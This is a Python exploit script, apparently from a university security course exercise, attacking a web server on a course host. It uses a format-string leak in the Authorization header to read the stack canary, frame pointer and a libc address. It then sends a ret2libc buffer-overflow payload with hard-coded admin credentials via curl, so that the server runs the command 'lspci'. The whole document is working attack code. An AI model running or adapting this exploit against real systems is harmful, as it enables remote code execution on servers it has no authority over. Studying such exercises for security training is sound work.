import base64
import requests
import binascii
import subprocess
import struct


def write_binary_data_from_hex(filename, hex_data):
    binary_data = binascii.unhexlify(hex_data)
    with open(filename, "wb") as file:
        file.write(binary_data)


response=[]
i=0
start="%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x :1"

b = base64.b64encode(bytes(start, 'utf-8')) # bytes
base64_str = b.decode('utf-8') # convert bytes to string
url = 'http://project-2.csec.chatzi.org:8000/'
headers = {
    'Content-Type': 'application/json',
    'Authorization': 'Basic '+base64_str
}
data = {
    'test': 'example'
}
try:
    response = requests.post(url, headers=headers, data=data)
except requests.exceptions.Timeout:
    print("Timeout occurred")
    start="%08x "+start

x=list(response.headers['WWW-Authenticate'].split(" "))

return_adress=x[-2]
canary=x[-6]
ebp=x[-3]

libkey=x[-14]



buf_adr=[]

targ=hex(int.from_bytes("lspci".encode(), byteorder='big'))[2:]+"3D"

payload=""

canary=str(struct.pack('<I', int(canary, 16)).hex())

postdata=str(struct.pack('<I', int(ebp, 16) - 120).hex())

sendaddr=str(struct.pack('<I', int(libkey,16)+45228).hex())

arg=str(struct.pack('<I', int(ebp, 16) - 32).hex())



for i in range(52):
    payload+="90"

payload+=postdata+"90909090"+canary.replace('00', '3D')+"90909090"+"90909090"+"90909090"+sendaddr+"90909090"+arg+targ.upper()+"00"

print("payload=\n"+payload)

payload=payload.replace('00', '3D')



write_binary_data_from_hex("payload.bin", payload)


command = ["curl -X POST http://project-2.csec.chatzi.org:8000/ -H 'Content-Length: 0' -u admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96 --data-binary '@payload.bin' "]    
try:
    subprocess.run(command,shell=True, check=True, timeout=3)  # Set the timeout value in seconds
except subprocess.TimeoutExpired:
    print("Subprocess execution timed out.")
except subprocess.CalledProcessError as e:
    print("Subprocess error:", e)